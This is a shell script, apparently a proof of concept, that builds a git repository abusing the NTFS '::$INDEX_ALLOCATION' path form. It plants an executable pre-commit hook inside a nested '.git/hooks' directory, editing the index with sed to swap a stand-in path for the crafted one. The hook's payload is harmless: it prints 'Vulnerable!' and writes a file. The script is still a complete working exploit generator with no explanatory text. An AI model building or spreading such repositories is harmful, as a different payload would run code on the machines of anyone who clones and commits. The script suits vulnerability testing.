#!/bin/sh
set -eu

repo="$1"
git init -- "$repo"
cd -- "$repo"

# shellcheck disable=SC2016
target_dir='subdir/.git::$INDEX_ALLOCATION/hooks'
target_dir_standin="$(printf '%s' "$target_dir" | sed 's|:|,|g')"
target_file="$target_dir/pre-commit"
target_file_standin="$target_dir_standin/pre-commit"

mkdir -p -- "$target_dir_standin"

cat >"$target_file_standin" <<'EOF'
#!/bin/sh
printf 'Vulnerable!\n'
date >vulnerable
EOF

git add --chmod=+x -- "$target_file_standin"

standin_pattern="$(printf '%s' "$target_file_standin" | sed 's|[.$]|\\&|g')"
cp .git/index old_index
LC_ALL=C sed "s|$standin_pattern|$target_file|g" old_index >.git/index

git commit -m 'Initial commit'
